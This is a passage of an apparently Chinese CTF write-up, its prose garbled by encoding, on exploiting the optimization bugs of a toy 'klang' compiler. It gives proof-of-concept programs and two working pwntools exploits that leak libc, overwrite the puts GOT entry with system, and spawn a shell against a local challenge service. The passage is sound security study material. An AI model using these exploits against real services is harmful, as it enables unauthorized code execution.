class="hljs-type">int</span><br>&#123;<br>d := <span class="hljs-number">1</span>;<br><span class="hljs-keyword">do</span><br>&#123;<br>c := a + b;<br>prints(<span class="hljs-string">&quot;OUTPUT c = 114514 + 233333:&quot;</span>);<br>printi(c);<br>d := d - <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">while</span>(d &gt; <span class="hljs-number">0</span>);<br><span class="hljs-keyword">return</span> d;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¼˜åŒ–å‰åçš„IRï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c">BEFORE:<br>define test<br>bb1:<br>        %<span class="hljs-number">0</span> = #<span class="hljs-number">0</span><br>        %<span class="hljs-number">1</span> = #<span class="hljs-number">0</span><br>        %<span class="hljs-number">1</span> = #<span class="hljs-number">1</span><br>        jmp bb3<br><br>bb2:<br>        ret %<span class="hljs-number">1</span><br><br>bb3:<br>        %<span class="hljs-number">2</span> = $<span class="hljs-number">0</span> + $<span class="hljs-number">1</span><br>        %<span class="hljs-number">0</span> = %<span class="hljs-number">2</span><br>        %<span class="hljs-number">4</span> = load_label __str0<br>        call prints %<span class="hljs-number">4</span><br>        call printi %<span class="hljs-number">0</span><br>        %<span class="hljs-number">6</span> = %<span class="hljs-number">1</span> - #<span class="hljs-number">1</span><br>        %<span class="hljs-number">1</span> = %<span class="hljs-number">6</span><br>        %<span class="hljs-number">7</span> = %<span class="hljs-number">1</span> &gt; #<span class="hljs-number">0</span><br>        jnz %<span class="hljs-number">7</span>, bb3, bb2<br>            <br>AFTER:<br>define test<br>bb1:<br>        %<span class="hljs-number">1</span> = #<span class="hljs-number">1</span><br>        jmp bb3<br><br>bb2:<br>        ret %<span class="hljs-number">1</span><br><br>bb3:<br>        %<span class="hljs-number">4</span> = load_label __str0<br>        call prints %<span class="hljs-number">4</span><br>        call printi %<span class="hljs-number">8</span><br>        %<span class="hljs-number">6</span> = %<span class="hljs-number">1</span> - #<span class="hljs-number">1</span><br>        %<span class="hljs-number">1</span> = %<span class="hljs-number">6</span><br>        %<span class="hljs-number">7</span> = %<span class="hljs-number">6</span> &gt; #<span class="hljs-number">0</span><br>        jnz %<span class="hljs-number">7</span>, bb3, bb2<br></code></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./gcse1</span>            <br>OUTPUT c = 114514 + 233333:<br>0<br></code></pre></td></tr></table></figure><p>ä¼šæœ‰è¿™ä¸ªè¾“å‡ºè¿˜æœ‰ä¸‹é¢ğŸ‘‡çš„é—®é¢˜çš„åŸå› </p></li><li><p>GlobalCSEBlockæ›¿æ¢çš„æ—¶å€™ä¼šå…ˆé€’å½’æ›¿æ¢BBæ‰€æœ‰å‰é©±ä¸­çš„exprå†æ¢BB</p><ul><li>ä½†æ›¿æ¢åæ²¡æœ‰Stateä¸­åˆ é™¤expr</li><li>å¦‚æœBBæ²¡æœ‰å‰é©±ä¼šé€ æˆæœªåˆå§‹åŒ–è®¿é—®</li></ul><p>POC</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span>:-&gt;<span class="hljs-type">int</span><br>&#123;<br>test(<span class="hljs-number">114514</span>, <span class="hljs-number">233333</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>function <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> : <span class="hljs-type">int</span> c, <span class="hljs-type">int</span> d -&gt; <span class="hljs-type">int</span><br>&#123;<br>c := a + <span class="hljs-number">1</span>;<br>printi(c);<br><span class="hljs-keyword">if</span> (b &gt; <span class="hljs-number">100</span>)<br>&#123;<br>d := a + <span class="hljs-number">1</span>;<br>&#125;;<br><span class="hljs-keyword">return</span> d;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¼˜åŒ–å‰åçš„IR</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">BEFORE:<br>define test<br>bb1:<br>        %<span class="hljs-number">0</span> = #<span class="hljs-number">0</span><br>        %<span class="hljs-number">1</span> = #<span class="hljs-number">0</span><br>        %<span class="hljs-number">2</span> = $<span class="hljs-number">0</span> + #<span class="hljs-number">1</span><br>        %<span class="hljs-number">0</span> = %<span class="hljs-number">2</span><br>        call printi %<span class="hljs-number">0</span><br>        %<span class="hljs-number">4</span> = $<span class="hljs-number">1</span> &gt; #<span class="hljs-number">64</span><br>        jnz %<span class="hljs-number">4</span>, bb3, bb2<br><br>bb2:<br>        ret %<span class="hljs-number">1</span><br><br>bb3:<br>        %<span class="hljs-number">5</span> = $<span class="hljs-number">0</span> + #<span class="hljs-number">1</span><br>        %<span class="hljs-number">1</span> = %<span class="hljs-number">5</span><br>        jmp bb2<br>            <br>AFTER:<br>define test<br>bb1:<br>        %<span class="hljs-number">1</span> = #<span class="hljs-number">0</span><br>        call printi %<span class="hljs-number">6</span><br>        %<span class="hljs-number">6</span> = $<span class="hljs-number">1</span> &gt; #<span class="hljs-number">64</span><br>        jnz %<span class="hljs-number">6</span>, bb3, bb2<br><br>bb2:<br>        ret %<span class="hljs-number">1</span><br><br>bb3:<br>        %<span class="hljs-number">1</span> = %<span class="hljs-number">6</span><br>        jmp bb2<br></code></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./gcse</span>            <br>140063322342087<br></code></pre></td></tr></table></figure></li></ul><h3 id="DeadCodeElimination"><a href="#DeadCodeElimination" class="headerlink" title="DeadCodeElimination"></a>DeadCodeElimination</h3><h4 id="DeadVariableElimination"><a href="#DeadVariableElimination" class="headerlink" title="DeadVariableElimination"></a>DeadVariableElimination</h4><p>æ•°æ®ç»“æ„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LivenessState</span> &#123;</span><br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">set</span>&lt;<span class="hljs-type">size_t</span>&gt; LiveRegs_;<br>&#125;;<br></code></pre></td></tr></table></figure><h5 id="BUG-4"><a href="#BUG-4" class="headerlink" title="BUG"></a>BUG</h5><p>åœ¨Callã€CallVoidå’ŒArrayStoreç›¸å…³å˜é‡åˆ¤æ–­çš„æ—¶å€™å–çš„æ˜¯Regçš„æœ€åä¸€æ¬¡å®šä¹‰ï¼Œæœ‰å¯èƒ½åœ¨è¯¥æŒ‡ä»¤ä¹‹åï¼Œè¿™æ ·ä¼šå¯¼è‡´ä¹‹å‰çš„å®šä¹‰è¢«ä¼˜åŒ–æ‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> InstIt = BB-&gt;begin(); InstIt != BB-&gt;end(); InstIt++) &#123;<br>  <span class="hljs-keyword">auto</span> &amp;Inst = *InstIt;<br>  <span class="hljs-keyword">if</span>(Inst.Type() == Instruction::Call <br>  || Inst.Type() == Instruction::CallVoid <br>  || Inst.Type() == Instruction::ArrayStore) &#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; Inst.Ins(); i++) &#123;<br>      <span class="hljs-keyword">auto</span> Op = Inst.GetIn(i);<br>      <span class="hljs-keyword">if</span>(Op.IsRegister()) &#123;<br>        AddAllToNeeded(LastDefs[Op.RegId()]);<span class="hljs-comment">// å–åˆ°çš„LastDefå¯èƒ½åœ¨Callä¹‹å</span><br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>POCï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span> : <span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span> c -&gt; <span class="hljs-type">int</span> <br>&#123;<br><span class="hljs-type">double</span>(c);<br>c := b + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>function <span class="hljs-title function_">double</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> : -&gt; <span class="hljs-type">int</span><br>&#123;<br><span class="hljs-keyword">return</span> a * a;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¼˜åŒ–å‰åçš„IRï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">BEFORE<br>define main<br>bb1:<br>        %<span class="hljs-number">0</span> = #<span class="hljs-number">0</span><br>        %<span class="hljs-number">1</span> = #<span class="hljs-number">0</span><br>        %<span class="hljs-number">2</span> = #<span class="hljs-number">0</span><br>        call <span class="hljs-type">double</span> %<span class="hljs-number">2</span><br>        %<span class="hljs-number">4</span> = #<span class="hljs-number">0</span> + #<span class="hljs-number">1</span><br>        %<span class="hljs-number">2</span> = %<span class="hljs-number">4</span><br>        ret #<span class="hljs-number">0</span><br><br>AFTER<br>define main<br>bb1:<br>        call <span class="hljs-type">double</span> %<span class="hljs-number">2</span><br>        %<span class="hljs-number">4</span> = #<span class="hljs-number">1</span><br>        %<span class="hljs-number">2</span> = %<span class="hljs-number">4</span><br>        ret #<span class="hljs-number">0</span><br>            <br>FINAL<br>define main<br>bb1:<br>        call <span class="hljs-type">double</span> #<span class="hljs-number">1</span><span class="hljs-comment">// %2 = #1æ˜¯å¸¸é‡ä¼ æ’­çš„é”…</span><br>        ret #<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="CodeGen"><a href="#CodeGen" class="headerlink" title="CodeGen"></a>CodeGen</h2><ul><li><p>Codegen</p><ul><li><p>æ•°æ®ç»“æ„ï¼š</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/mf.png" class title="mf"></li><li><p>åŠŸèƒ½ï¼šIRè½¬æŒ‡ä»¤ï¼Œæ›¿æ¢è™šæ‹Ÿå¯„å­˜å™¨</p></li></ul></li><li><p>InstSched</p><ul><li><p>æ•°æ®ç»“æ„ï¼š</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/node.png" class title="node"></li><li><p>åŠŸèƒ½ï¼šæŒ‡ä»¤è°ƒåº¦ï¼Œé¡ºåºä¼˜åŒ–</p></li></ul></li><li><p>RegAllocï¼š</p><ul><li><p>æ•°æ®ç»“æ„ï¼š</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/live.png" class title="live"></li><li><p>åŠŸèƒ½ï¼šå¯„å­˜å™¨åˆ†é…</p></li></ul></li></ul><h3 id="RegAlloc"><a href="#RegAlloc" class="headerlink" title="RegAlloc"></a>RegAlloc</h3><p>Linear Scanç®—æ³•ï¼š</p><img src="/2024/03/30/%E9%98%BF%E9%87%8C%E4%BA%91klang/scan.png" class title="scan"><h4 id="BUG-5"><a href="#BUG-5" class="headerlink" title="BUG"></a>BUG</h4><p>å‘ç”ŸSpillçš„æ—¶å€™åªä»å½“å‰Intervalçš„Startå¼€å§‹ï¼Œä¹Ÿå°±æ˜¯åªä»å‘ç”ŸSpillçš„æ—¶é—´ç‚¹å¼€å§‹æ ‡è®°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(Active.size() == kAllocatableRegisters) &#123;<br>  <span class="hljs-keyword">auto</span> [Spilled, _] = SpillAtInterval(I);<br>  <span class="hljs-keyword">auto</span> Slot = AllocateSpillSlot(Spilled);<br>  Spilled-&gt;SpillAt(I-&gt;Start(), Slot);<br>&#125; <br></code></pre></td></tr></table></figure><p>å¦‚æœæœ‰BackEdgeçš„è¯ä¼šæœ‰é—®é¢˜ï¼Œä¼šä½¿ç”¨Spillå‰çš„å¯„å­˜å™¨è€Œä¸æ˜¯Stackç©ºé—´</p><p>POCï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span> : <span class="hljs-built_in">array</span> a, <span class="hljs-built_in">array</span> b, <span class="hljs-built_in">array</span> c, <span class="hljs-built_in">array</span> d, <span class="hljs-built_in">array</span> e, <span class="hljs-built_in">array</span> f, <span class="hljs-type">int</span> g -&gt; <span class="hljs-type">int</span><br>&#123;<br>a := array_new(<span class="hljs-number">1</span>);<br>b := array_new(<span class="hljs-number">2</span>);<br>c := array_new(<span class="hljs-number">3</span>);<br>d := array_new(<span class="hljs-number">4</span>);<br>e := array_new(<span class="hljs-number">5</span>);<br>f := array_new(<span class="hljs-number">7</span>);<br><span class="hljs-keyword">do</span><br>&#123;<br>f[<span class="hljs-number">0</span>] := <span class="hljs-number">10</span>;<br>g := inputi();<br>a[<span class="hljs-number">0</span>] := <span class="hljs-number">1</span>;<br>b[<span class="hljs-number">0</span>] := <span class="hljs-number">2</span>;<br>c[<span class="hljs-number">0</span>] := <span class="hljs-number">3</span>;<br>d[<span class="hljs-number">0</span>] := <span class="hljs-number">4</span>;<br>e[<span class="hljs-number">0</span>] := <span class="hljs-number">5</span>;<br>f[<span class="hljs-number">0</span>] := <span class="hljs-number">6</span>;<br>&#125;<br><span class="hljs-keyword">while</span>(inputi());<br>dup(g);<br>dup(f[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>function <span class="hljs-title function_">dup</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> : -&gt; <span class="hljs-type">int</span><br>&#123;<br><span class="hljs-keyword">return</span> a * a;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¾“å…¥è¾“å‡ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./test</span><br>114514<br>1<br>zsh: segmentation fault  ./test<br></code></pre></td></tr></table></figure><h1 id="ç»ˆäºèƒ½å¼€å§‹pwnäº†-Ë‰â–½Ë‰ï¼›-â€¦"><a href="#ç»ˆäºèƒ½å¼€å§‹pwnäº†-Ë‰â–½Ë‰ï¼›-â€¦" class="headerlink" title="ç»ˆäºèƒ½å¼€å§‹pwnäº†(Ë‰â–½Ë‰ï¼›)â€¦"></a>ç»ˆäºèƒ½å¼€å§‹pwnäº†(Ë‰â–½Ë‰ï¼›)â€¦</h1><h2 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h2><p>GlobalCSEæœªåˆå§‹åŒ–æ³„æ¼libc + RegAllocä»»æ„å†™æ”¹putsçš„gotè¡¨</p><ul><li><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment">#p=process(&#x27;./test&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exp.klang&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    content=file.read()<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Give me your code, ended by a line with \&#x27;END_OF_SNIPPET\&#x27; (excluding quote).&#x27;</span>,content.encode())<br>p.sendline(<span class="hljs-string">b&#x27;END_OF_SNIPPET&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>p.recvline()<br>libcbase=<span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>].decode())-<span class="hljs-number">0xe2d9b</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x4006a0</span>).encode())<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]).encode())<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure></li><li><p>exp.klang</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span> : <span class="hljs-type">int</span> libcbase -&gt; <span class="hljs-type">int</span><br>&#123;<br>leak_libc(<span class="hljs-number">123123</span>, <span class="hljs-number">23333</span>);<br>hack();<br>prints(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>function <span class="hljs-title function_">leak_libc</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> :  <span class="hljs-type">int</span> c, <span class="hljs-type">int</span> d-&gt; <span class="hljs-type">int</span><br>&#123;<br>c := a + <span class="hljs-number">1</span>;<br>printi(c);<br><span class="hljs-keyword">if</span> (b &gt; <span class="hljs-number">100</span>)<br>&#123;<br>d := a + <span class="hljs-number">1</span>;<br>&#125;;<br><span class="hljs-keyword">return</span> d;<br>&#125;<br><br>function <span class="hljs-title function_">hack</span><span class="hljs-params">()</span> : <span class="hljs-built_in">array</span> a, <span class="hljs-built_in">array</span> b, <span class="hljs-built_in">array</span> c, <span class="hljs-built_in">array</span> d, <span class="hljs-built_in">array</span> e, <span class="hljs-built_in">array</span> f, <span class="hljs-type">int</span> g -&gt; <span class="hljs-type">int</span><br>&#123;<br>a := array_new(<span class="hljs-number">1</span>);<br>b := array_new(<span class="hljs-number">2</span>);<br>c := array_new(<span class="hljs-number">3</span>);<br>d := array_new(<span class="hljs-number">4</span>);<br>e := array_new(<span class="hljs-number">5</span>);<br>f := array_new(<span class="hljs-number">7</span>);<br><span class="hljs-keyword">do</span><br>&#123;<br>f[<span class="hljs-number">0</span>] := inputi();<br>g := inputi();<br>a[<span class="hljs-number">0</span>] := <span class="hljs-number">1</span>;<br>b[<span class="hljs-number">0</span>] := <span class="hljs-number">2</span>;<br>c[<span class="hljs-number">0</span>] := <span class="hljs-number">3</span>;<br>d[<span class="hljs-number">0</span>] := <span class="hljs-number">4</span>;<br>e[<span class="hljs-number">0</span>] := <span class="hljs-number">5</span>;<br>&#125;<br><span class="hljs-keyword">while</span>(inputi());<br>dup(g);<br>dup(f[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>function <span class="hljs-title function_">dup</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> : -&gt; <span class="hljs-type">int</span><br>&#123;<br><span class="hljs-keyword">return</span> a * a;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h2><p>GlobalCSEæœªåˆå§‹åŒ–æ³„æ¼libc + DCEä»»æ„å†™</p><ul><li><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment">#p=process(&#x27;./test&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exp.klang&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    content=file.read()<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Give me your code, ended by a line with \&#x27;END_OF_SNIPPET\&#x27; (excluding quote).&#x27;</span>,content.encode())<br>p.sendline(<span class="hljs-string">b&#x27;END_OF_SNIPPET&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>p.recvline()<br>libcbase=<span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>].decode())-<span class="hljs-number">0xe2d9b</span><br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x4006a0</span>).encode())<br>p.sendline(<span class="hljs-built_in">str</span>(libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]).encode())<br>p.interactive()<br></code></pre></td></tr></table></figure></li><li><p>exp.klang</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span> : <span class="hljs-type">int</span> a -&gt; <span class="hljs-type">int</span><br>&#123;<br>leak_libc(<span class="hljs-number">123</span>, <span class="hljs-number">456</span>);<br>write();<br>prints(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>function <span class="hljs-title function_">write</span><span class="hljs-params">()</span> : <span class="hljs-type">int</span> a -&gt; <span class="hljs-type">void</span><br>&#123;<br>a := inputi();<br>write_();<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>function <span class="hljs-title function_">write_</span><span class="hljs-params">()</span> : <span class="hljs-built_in">array</span> c -&gt; <span class="hljs-type">void</span><br>&#123;<br>c[<span class="hljs-number">0</span>] := inputi();<br>c := array_new(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>function <span class="hljs-title function_">leak_libc</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> :  <span class="hljs-type">int</span> c, <span class="hljs-type">int</span> d-&gt; <span class="hljs-type">int</span><br>&#123;<br>c := a + <span class="hljs-number">1</span>;<br>printi(c);<br><span class="hljs-keyword">if</span> (b &gt; <span class="hljs-number">100</span>)<br>&#123;<br>d := a + <span class="hljs-number">1</span>;<br>&#125;;<br><span class="hljs-keyword">return</span> d;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="exp3"><a href="#exp3" class="headerlink" 